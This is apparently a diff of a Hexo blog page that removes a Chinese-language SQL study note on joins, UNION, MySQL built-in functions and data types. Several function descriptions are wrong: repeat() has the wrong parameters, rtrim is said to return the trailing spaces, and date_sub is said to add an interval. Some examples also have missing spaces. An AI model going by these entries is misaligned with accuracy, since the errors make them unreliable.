-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-51-34.png" alt="别名" class="lazyload"></p>
-<p><strong>JOIN</strong><br>join用于根据两个或多个表中间的列的关系从这些表中查询数据如果表中至少一个匹配则返回行<br><strong>inner join内连接</strong><br>在表中存在至少一个匹配时，则返回行。inner join 和join是相同的。</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> 表名<span class="hljs-number">2</span> <span class="hljs-keyword">on</span> 表名<span class="hljs-number">1.</span>字段名<span class="hljs-operator">=</span>表名<span class="hljs-number">2.</span>字段名<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-20-53-52.png" alt="join" class="lazyload"></p>
-<p><strong>left join/left outer join左连接</strong><br>即使右表中没有匹配也从左表返回所有的行</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> 表名<span class="hljs-number">2</span> <span class="hljs-keyword">on</span> 表名<span class="hljs-number">1.</span>字段名<span class="hljs-operator">=</span>表名<span class="hljs-number">2.</span>字段名<br></code></pre></td></tr></table></figure>
-
-<p><strong>right join / right outer join右连接</strong><br>即使左表中没有匹配，也从右表返回所有行</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">join</span> 表名<span class="hljs-number">2</span> <span class="hljs-keyword">on</span> 表名<span class="hljs-number">1.</span>字段名<span class="hljs-operator">=</span>表名<span class="hljs-number">2.</span>字段名<br></code></pre></td></tr></table></figure>
-
-<p><strong>full join/full outer join全连接</strong><br>只要其中一个表存在匹配就返回行</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">full</span> <span class="hljs-keyword">join</span> 表名<span class="hljs-number">2</span> <span class="hljs-keyword">on</span> 表名<span class="hljs-number">1.</span>字段名<span class="hljs-operator">=</span>表名<span class="hljs-number">2.</span>字段名<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-21-10-23.png" alt="join" class="lazyload"></p>
-<p><strong>union操作符</strong><br>union操作符用于<em>合并</em>两个或多个select语句的结果集。union内部的select语句<em>必须拥有相同数量的列</em>。列也必须<em>拥有相似的数据类型</em>。同时每一条select语句中的列的<em>顺序必须相同</em>。union操作符<em>默认选取不同</em>的值。如果<em>允许重复</em>的值，请使用<em>union all</em>。<br>union结果集中的列名总是等于union中第一个select语句中的列名。<br>行专列用groupby+sumif列转行用unionn all</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span>语法 <span class="hljs-comment">--union命令只会选取不同的值</span><br><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">2</span><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span>语法<br><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-20-34-55.png" alt="union" class="lazyload"></p>
-<h2 id="数据库的一些函数"><a href="#数据库的一些函数" class="headerlink" title="数据库的一些函数"></a>数据库的一些函数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">一、数学函数<br><span class="hljs-built_in">abs</span>(x) 返回x的绝对值<br>bin(x) 返回x的二进制（oct返回八进制，hex返回十六进制）<br><span class="hljs-built_in">ceiling</span>(x) 返回大于x的最小整数值<br><span class="hljs-built_in">exp</span>(x) 返回值e（自然对数的底）的x次方<br><span class="hljs-built_in">floor</span>(x) 返回小于x的最大整数值<br>greatest(x1,x2,...,xn)返回集合中最大的值<br>least(x1,x2,...,xn) 返回集合中最小的值<br><span class="hljs-built_in">ln</span>(x) 返回x的自然对数<br><span class="hljs-built_in">log</span>(x,y)返回x的以y为底的对数<br><span class="hljs-built_in">mod</span>(x,y) 返回x<span class="hljs-operator">/</span>y的模（余数）<br>pi()返回pi的值（圆周率）<br>rand()返回０到１内的随机值,可以通过提供一个参数(种子)使rand()随机数生成器生成一个指定的值。<br>round(x,y)返回参数x的四舍五入的有y位小数的值<br>sign(x) 返回代表数字x的符号的值<br><span class="hljs-built_in">sqrt</span>(x) 返回一个数的平方根<br><span class="hljs-keyword">truncate</span>(x,y) 返回数字x截短为y位小数的结果<br> <br>二、聚合函数(常用于<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>从句的<span class="hljs-keyword">select</span>查询中)<br><span class="hljs-built_in">avg</span>(col)返回指定列的平均值<br><span class="hljs-built_in">count</span>(col)返回指定列中非<span class="hljs-keyword">null</span>值的个数<br><span class="hljs-built_in">min</span>(col)返回指定列的最小值<br><span class="hljs-built_in">max</span>(col)返回指定列的最大值<br><span class="hljs-built_in">sum</span>(col)返回指定列的所有值之和<br>group_concat(col) 返回由属于一组的列值连接组合而成的结果<br> <br>三、字符串函数<br>ascii(<span class="hljs-type">char</span>)返回字符的ascii码值<br>bit_length(str)返回字符串的比特长度<br>concat(s1,s2...,sn)将s1,s2...,sn连接成字符串<br>concat_ws(sep,s1,s2...,sn)将s1,s2...,sn连接成字符串，并用sep字符间隔<br><span class="hljs-keyword">insert</span>(str,x,y,instr) 将字符串str从第x位置开始，y个字符长的子串替换为字符串instr，返回结果<br>find_in_set(str,list)分析逗号分隔的list列表，如果发现str，返回str在list中的位置<br>lcase(str)或<span class="hljs-built_in">lower</span>(str) 返回将字符串str中所有字符改变为小写后的结果<br><span class="hljs-keyword">left</span>(str,x)返回字符串str中最左边的x个字符<br>length(s)返回字符串str中的字符数<br>ltrim(str) 从字符串str中切掉开头的空格<br><span class="hljs-built_in">position</span>(substr <span class="hljs-keyword">in</span> str) 返回子串substr在字符串str中第一次出现的位置<br>quote(str) 用反斜杠转义str中的单引号<br>repeat(str,srchstr,rplcstr)返回字符串str重复x次的结果<br>reverse(str) 返回颠倒字符串str的结果<br><span class="hljs-keyword">right</span>(str,x) 返回字符串str中最右边的x个字符<br>rtrim(str) 返回字符串str尾部的空格<br>strcmp(s1,s2)比较字符串s1和s2<br><span class="hljs-built_in">trim</span>(str)去除字符串首部和尾部的所有空格<br>ucase(str)或<span class="hljs-built_in">upper</span>(str) 返回将字符串str中所有字符转变为大写后的结果<br> <br>四、日期和时间函数<br>curdate()或<span class="hljs-built_in">current_date</span>() 返回当前的日期<br>curtime()或<span class="hljs-built_in">current_time</span>() 返回当前的时间<br>date_add(<span class="hljs-type">date</span>,<span class="hljs-type">interval</span> <span class="hljs-type">int</span> keyword)返回日期<span class="hljs-type">date</span>加上间隔时间<span class="hljs-type">int</span>的结果(<span class="hljs-type">int</span>必须按照关键字进行格式化),如：selectdate_add(<span class="hljs-built_in">current_date</span>,<span class="hljs-type">interval</span> <span class="hljs-number">6</span> <span class="hljs-keyword">month</span>);<br>date_format(<span class="hljs-type">date</span>,fmt) 依照指定的fmt格式格式化日期<span class="hljs-type">date</span>值<br>date_sub(<span class="hljs-type">date</span>,<span class="hljs-type">interval</span> <span class="hljs-type">int</span> keyword)返回日期<span class="hljs-type">date</span>加上间隔时间<span class="hljs-type">int</span>的结果(<span class="hljs-type">int</span>必须按照关键字进行格式化),如：selectdate_sub(<span class="hljs-built_in">current_date</span>,<span class="hljs-type">interval</span> <span class="hljs-number">6</span> <span class="hljs-keyword">month</span>);<br>dayofweek(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>所代表的一星期中的第几天(<span class="hljs-number">1</span><span class="hljs-operator">~</span><span class="hljs-number">7</span>)<br>dayofmonth(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>是一个月的第几天(<span class="hljs-number">1</span><span class="hljs-operator">~</span><span class="hljs-number">31</span>)<br>dayofyear(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>是一年的第几天(<span class="hljs-number">1</span><span class="hljs-operator">~</span><span class="hljs-number">366</span>)<br>dayname(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>的星期名，如：<span class="hljs-keyword">select</span> dayname(<span class="hljs-built_in">current_date</span>);<br>from_unixtime(ts,fmt) 根据指定的fmt格式，格式化unix时间戳ts<br><span class="hljs-keyword">hour</span>(<span class="hljs-type">time</span>) 返回<span class="hljs-type">time</span>的小时值(<span class="hljs-number">0</span><span class="hljs-operator">~</span><span class="hljs-number">23</span>)<br><span class="hljs-keyword">minute</span>(<span class="hljs-type">time</span>) 返回<span class="hljs-type">time</span>的分钟值(<span class="hljs-number">0</span><span class="hljs-operator">~</span><span class="hljs-number">59</span>)<br><span class="hljs-keyword">month</span>(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>的月份值(<span class="hljs-number">1</span><span class="hljs-operator">~</span><span class="hljs-number">12</span>)<br>monthname(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>的月份名，如：<span class="hljs-keyword">select</span> monthname(<span class="hljs-built_in">current_date</span>);<br>now() 返回当前的日期和时间<br>quarter(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>在一年中的季度(<span class="hljs-number">1</span><span class="hljs-operator">~</span><span class="hljs-number">4</span>)，如<span class="hljs-keyword">select</span> quarter(<span class="hljs-built_in">current_date</span>);<br>week(<span class="hljs-type">date</span>) 返回日期<span class="hljs-type">date</span>为一年中第几周(<span class="hljs-number">0</span><span class="hljs-operator">~</span><span class="hljs-number">53</span>)<br><span class="hljs-keyword">year</span>(<span class="hljs-type">date</span>) 返回日期<span class="hljs-type">date</span>的年份(<span class="hljs-number">1000</span><span class="hljs-operator">~</span><span class="hljs-number">9999</span>)<br>一些示例：<br>获取当前系统时间：<span class="hljs-keyword">select</span> from_unixtime(unix_timestamp());<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">extract</span>(year_month <span class="hljs-keyword">from</span> <span class="hljs-built_in">current_date</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">extract</span>(day_second <span class="hljs-keyword">from</span> <span class="hljs-built_in">current_date</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">extract</span>(hour_minute <span class="hljs-keyword">from</span> <span class="hljs-built_in">current_date</span>);<br>返回两个日期值之间的差值(月数)：<span class="hljs-keyword">select</span> period_diff(<span class="hljs-number">200302</span>,<span class="hljs-number">199802</span>);<br>在mysql中计算年龄：<br><span class="hljs-keyword">select</span> date_format(from_days(to_days(now())<span class="hljs-operator">-</span>to_days(birthday)),<span class="hljs-string">&#x27;%y&#x27;</span>)<span class="hljs-operator">+</span><span class="hljs-number">0</span> <span class="hljs-keyword">as</span> age <span class="hljs-keyword">from</span> employee;<br>这样，如果brithday是未来的年月日的话，计算结果为<span class="hljs-number">0</span>。<br>下面的<span class="hljs-keyword">sql</span>语句计算员工的绝对年龄，即当birthday是未来的日期时，将得到负值。<br><span class="hljs-keyword">select</span> date_format(now(), <span class="hljs-string">&#x27;%y&#x27;</span>) <span class="hljs-operator">-</span> date_format(birthday, <span class="hljs-string">&#x27;%y&#x27;</span>) <span class="hljs-operator">-</span>(date_format(now(), <span class="hljs-string">&#x27;00-%m-%d&#x27;</span>) <span class="hljs-operator">&lt;</span>date_format(birthday, <span class="hljs-string">&#x27;00-%m-%d&#x27;</span>)) <span class="hljs-keyword">as</span> age <span class="hljs-keyword">from</span> employee<br> <br>五、加密函数<br>aes_encrypt(str,key) 返回用密钥key对字符串str利用高级加密标准算法加密后的结果，调用aes_encrypt的结果是一个二进制字符串，以<span class="hljs-type">blob</span>类型存储<br>aes_decrypt(str,key) 返回用密钥key对字符串str利用高级加密标准算法解密后的结果<br>decode(str,key) 使用key作为密钥解密加密字符串str<br>encrypt(str,salt) 使用unixcrypt()函数，用关键词salt(一个可以惟一确定口令的字符串，就像钥匙一样)加密字符串str<br>encode(str,key) 使用key作为密钥加密字符串str，调用encode()的结果是一个二进制字符串，它以<span class="hljs-type">blob</span>类型存储<br>md5() 计算字符串str的md5校验和<br>password(str) 返回字符串str的加密版本，这个加密过程是不可逆转的，和unix密码加密过程使用不同的算法。<br>sha() 计算字符串str的安全散列算法(sha)校验和<br>示例：<br><span class="hljs-keyword">select</span> encrypt(<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;salt&#x27;</span>);<br><span class="hljs-keyword">select</span> encode(<span class="hljs-string">&#x27;xufeng&#x27;</span>,<span class="hljs-string">&#x27;key&#x27;</span>);<br><span class="hljs-keyword">select</span> decode(encode(<span class="hljs-string">&#x27;xufeng&#x27;</span>,<span class="hljs-string">&#x27;key&#x27;</span>),<span class="hljs-string">&#x27;key&#x27;</span>);#加解密放在一起<br><span class="hljs-keyword">select</span> aes_encrypt(<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;key&#x27;</span>);<br><span class="hljs-keyword">select</span> aes_decrypt(aes_encrypt(<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;key&#x27;</span>),<span class="hljs-string">&#x27;key&#x27;</span>);<br><span class="hljs-keyword">select</span> md5(<span class="hljs-string">&#x27;123456&#x27;</span>);<br><span class="hljs-keyword">select</span> sha(<span class="hljs-string">&#x27;123456&#x27;</span>);<br> <br>六、控制流函数<br>mysql有<span class="hljs-number">4</span>个函数是用来进行条件操作的，这些函数可以实现<span class="hljs-keyword">sql</span>的条件逻辑，允许开发者将一些应用程序业务逻辑转换到数据库后台。<br>mysql控制流函数：<br><span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span>[test1] <span class="hljs-keyword">then</span> [result1]...<span class="hljs-keyword">else</span> [<span class="hljs-keyword">default</span>] <span class="hljs-keyword">end</span>如果testn是真，则返回resultn，否则返回<span class="hljs-keyword">default</span><br><span class="hljs-keyword">case</span> [test] <span class="hljs-keyword">when</span>[val1] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span>]...<span class="hljs-keyword">else</span> [<span class="hljs-keyword">default</span>]<span class="hljs-keyword">end</span> 如果test和valn相等，则返回resultn，否则返回<span class="hljs-keyword">default</span><br>if(test,t,f) 如果test是真，返回t；否则返回f<br>ifnull(arg1,arg2) 如果arg1不是空，返回arg1，否则返回arg2<br><span class="hljs-built_in">nullif</span>(arg1,arg2) 如果arg1<span class="hljs-operator">=</span>arg2返回<span class="hljs-keyword">null</span>；否则返回arg1<br>这些函数的第一个是ifnull()，它有两个参数，并且对第一个参数进行判断。如果第一个参数不是<span class="hljs-keyword">null</span>，函数就会向调用者返回第一个参数；如果是<span class="hljs-keyword">null</span>,将返回第二个参数。<br>如：<span class="hljs-keyword">select</span> ifnull(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>), ifnull(<span class="hljs-keyword">null</span>,<span class="hljs-number">10</span>),ifnull(<span class="hljs-number">4</span><span class="hljs-operator">*</span><span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;false&#x27;</span>);<br><span class="hljs-built_in">nullif</span>()函数将会检验提供的两个参数是否相等，如果相等，则返回<span class="hljs-keyword">null</span>，如果不相等，就返回第一个参数。<br>如：<span class="hljs-keyword">select</span> <span class="hljs-built_in">nullif</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">nullif</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>),<span class="hljs-built_in">nullif</span>(<span class="hljs-number">2</span><span class="hljs-operator">+</span><span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>);<br>和许多脚本语言提供的if()函数一样，mysql的if()函数也可以建立一个简单的条件测试，这个函数有三个参数，第一个是要被判断的表达式，如果表达式为真，if()将会返回第二个参数，如果为假，if()将会返回第三个参数。<br>如：selectif(<span class="hljs-number">1</span><span class="hljs-operator">&lt;</span><span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>),if(<span class="hljs-number">56</span><span class="hljs-operator">&gt;</span><span class="hljs-number">100</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;false&#x27;</span>);<br>if()函数在只有两种可能结果时才适合使用。然而，在现实世界中，我们可能发现在条件测试中会需要多个分支。在这种情况下，mysql提供了<span class="hljs-keyword">case</span>函数，它和php及perl语言的switch<span class="hljs-operator">-</span><span class="hljs-keyword">case</span>条件例程一样。<br><span class="hljs-keyword">case</span>函数的格式有些复杂，通常如下所示：<br><span class="hljs-keyword">case</span> [expression <span class="hljs-keyword">to</span> be evaluated]<br><span class="hljs-keyword">when</span> [val <span class="hljs-number">1</span>] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span> <span class="hljs-number">1</span>]<br><span class="hljs-keyword">when</span> [val <span class="hljs-number">2</span>] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span> <span class="hljs-number">2</span>]<br><span class="hljs-keyword">when</span> [val <span class="hljs-number">3</span>] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span> <span class="hljs-number">3</span>]<br>......<br><span class="hljs-keyword">when</span> [val n] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span> n]<br><span class="hljs-keyword">else</span> [<span class="hljs-keyword">default</span> <span class="hljs-keyword">result</span>]<br><span class="hljs-keyword">end</span><br>这里，第一个参数是要被判断的值或表达式，接下来的是一系列的<span class="hljs-keyword">when</span><span class="hljs-operator">-</span><span class="hljs-keyword">then</span>块，每一块的第一个参数指定要比较的值，如果为真，就返回结果。所有的<span class="hljs-keyword">when</span><span class="hljs-operator">-</span><span class="hljs-keyword">then</span>块将以<span class="hljs-keyword">else</span>块结束，当<span class="hljs-keyword">end</span>结束了所有外部的<span class="hljs-keyword">case</span>块时，如果前面的每一个块都不匹配就会返回<span class="hljs-keyword">else</span>块指定的默认结果。如果没有指定<span class="hljs-keyword">else</span>块，而且所有的<span class="hljs-keyword">when</span><span class="hljs-operator">-</span><span class="hljs-keyword">then</span>比较都不是真，mysql将会返回<span class="hljs-keyword">null</span>。<br><span class="hljs-keyword">case</span>函数还有另外一种句法，有时使用起来非常方便，如下：<br><span class="hljs-keyword">case</span><br><span class="hljs-keyword">when</span> [conditional test <span class="hljs-number">1</span>] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span> <span class="hljs-number">1</span>]<br><span class="hljs-keyword">when</span> [conditional test <span class="hljs-number">2</span>] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span> <span class="hljs-number">2</span>]<br><span class="hljs-keyword">else</span> [<span class="hljs-keyword">default</span> <span class="hljs-keyword">result</span>]<br><span class="hljs-keyword">end</span><br>这种条件下，返回的结果取决于相应的条件测试是否为真。<br>示例：<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;green&#x27;</span><br><span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;red&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;stop&#x27;</span><br><span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;green&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;go&#x27;</span> <span class="hljs-keyword">end</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-number">9</span> <span class="hljs-keyword">when</span> <span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">when</span> <span class="hljs-number">2</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;b&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;n/a&#x27;</span> <span class="hljs-keyword">end</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (<span class="hljs-number">2</span><span class="hljs-operator">+</span><span class="hljs-number">2</span>)<span class="hljs-operator">=</span><span class="hljs-number">4</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;ok&#x27;</span> <span class="hljs-keyword">when</span>(<span class="hljs-number">2</span><span class="hljs-operator">+</span><span class="hljs-number">2</span>)<span class="hljs-operator">&lt;&gt;</span><span class="hljs-number">4</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;not ok&#x27;</span> <span class="hljs-keyword">end</span> asstatus;<br><span class="hljs-keyword">select</span> name,if((isactive <span class="hljs-operator">=</span> <span class="hljs-number">1</span>),<span class="hljs-string">&#x27;已激活&#x27;</span>,<span class="hljs-string">&#x27;未激活&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">result</span> fromuserlogininfo;<br><span class="hljs-keyword">select</span> fname,lname,(math<span class="hljs-operator">+</span>sci<span class="hljs-operator">+</span>lit) <span class="hljs-keyword">as</span> total,<br><span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (math<span class="hljs-operator">+</span>sci<span class="hljs-operator">+</span>lit) <span class="hljs-operator">&lt;</span> <span class="hljs-number">50</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;d&#x27;</span><br><span class="hljs-keyword">when</span> (math<span class="hljs-operator">+</span>sci<span class="hljs-operator">+</span>lit) <span class="hljs-keyword">between</span> <span class="hljs-number">50</span> <span class="hljs-keyword">and</span> <span class="hljs-number">150</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;c&#x27;</span><br><span class="hljs-keyword">when</span> (math<span class="hljs-operator">+</span>sci<span class="hljs-operator">+</span>lit) <span class="hljs-keyword">between</span> <span class="hljs-number">151</span> <span class="hljs-keyword">and</span> <span class="hljs-number">250</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;b&#x27;</span><br><span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">end</span><br><span class="hljs-keyword">as</span> grade <span class="hljs-keyword">from</span> marks;<br><span class="hljs-keyword">select</span> if(encrypt(<span class="hljs-string">&#x27;sue&#x27;</span>,<span class="hljs-string">&#x27;ts&#x27;</span>)<span class="hljs-operator">=</span>upass,<span class="hljs-string">&#x27;allow&#x27;</span>,<span class="hljs-string">&#x27;deny&#x27;</span>) <span class="hljs-keyword">as</span> loginresultfrom users <span class="hljs-keyword">where</span> uname <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;sue&#x27;</span>;#一个登陆验证<br> <br>七、格式化函数<br>date_format(<span class="hljs-type">date</span>,fmt) 依照字符串fmt格式化日期<span class="hljs-type">date</span>值<br>format(x,y) 把x格式化为以逗号隔开的数字序列，y是结果的小数位数<br>inet_aton(ip) 返回ip地址的数字表示<br>inet_ntoa(num) 返回数字所代表的ip地址<br>time_format(<span class="hljs-type">time</span>,fmt) 依照字符串fmt格式化时间<span class="hljs-type">time</span>值<br>其中最简单的是format()函数，它可以把大的数值格式化为以逗号间隔的易读的序列。<br>示例：<br><span class="hljs-keyword">select</span> format(<span class="hljs-number">34234.34323432</span>,<span class="hljs-number">3</span>);<br><span class="hljs-keyword">select</span> date_format(now(),<span class="hljs-string">&#x27;%w,%d %m %y %r&#x27;</span>);<br><span class="hljs-keyword">select</span> date_format(now(),<span class="hljs-string">&#x27;%y-%m-%d&#x27;</span>);<br><span class="hljs-keyword">select</span> date_format(<span class="hljs-number">19990330</span>,<span class="hljs-string">&#x27;%y-%m-%d&#x27;</span>);<br><span class="hljs-keyword">select</span> date_format(now(),<span class="hljs-string">&#x27;%h:%i %p&#x27;</span>);<br><span class="hljs-keyword">select</span> inet_aton(<span class="hljs-string">&#x27;10.122.89.47&#x27;</span>);<br><span class="hljs-keyword">select</span> inet_ntoa(<span class="hljs-number">175790383</span>);<br> <br>八、类型转化函数<br>为了进行数据类型转化，mysql提供了<span class="hljs-built_in">cast</span>()函数，它可以把一个值转化为指定的数据类型。类型有：<span class="hljs-type">binary</span>,<span class="hljs-type">char</span>,<span class="hljs-type">date</span>,<span class="hljs-type">time</span>,datetime,signed,unsigned<br>示例：<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">cast</span>(now() <span class="hljs-keyword">as</span> signed <span class="hljs-type">integer</span>),curdate()<span class="hljs-operator">+</span><span class="hljs-number">0</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;f&#x27;</span><span class="hljs-operator">=</span><span class="hljs-type">binary</span> <span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span><span class="hljs-operator">=</span><span class="hljs-built_in">cast</span>(<span class="hljs-string">&#x27;f&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">binary</span>);<br> <br>九、系统信息函数<br>database() 返回当前数据库名<br>benchmark(count,expr) 将表达式expr重复运行count次<br>connection_id() 返回当前客户的连接id<br>found_rows() 返回最后一个<span class="hljs-keyword">select</span>查询进行检索的总行数<br><span class="hljs-keyword">user</span>()或<span class="hljs-built_in">system_user</span>() 返回当前登陆用户名<br>version() 返回mysql服务器的版本<br>示例：<br><span class="hljs-keyword">select</span> database(),version(),<span class="hljs-keyword">user</span>();<br>selectbenchmark(<span class="hljs-number">9999999</span>,<span class="hljs-built_in">log</span>(rand()<span class="hljs-operator">*</span>pi()));#该例中,mysql计算<span class="hljs-built_in">log</span>(rand()<span class="hljs-operator">*</span>pi())表达式<span class="hljs-number">9999999</span>次。<br></code></pre></td></tr></table></figure>
-
-<p>进行尝试：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-21-37-27.png" alt="函数执行" class="lazyload"></p>
-<h2 id="数据库的数据类型"><a href="#数据库的数据类型" class="headerlink" title="数据库的数据类型"></a>数据库的数据类型</h2><p>mysql中主要类型：文本、数字、日期<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-21-18-38.png" alt="数据类型" class="lazyload"></p>
-<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul>
-<li>sql对大小写不敏感。</li>
-<li>分号是在数据系统中分隔每条sql语句的标准方法，这样就可以在对服务器的相同请求中执行一条以上的语句。</li>
-<li>条件值周围使用的是单引号。sql使用单引号来环绕文本值（也接受双引号）。如果是数值，不要使用引号。</li>
-</ul>
-
-            
-        </article>
-    </div>
-    
 </section>
 
     <nav class="nexmoe-page-nav">
@@ -986,7 +866,7 @@
 
  
 
-<script async src="/js/app.js?v=1681535802755"></script>
+<script async src="/js/app.js?v=1681885929858"></script>
 
 <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
 <script>
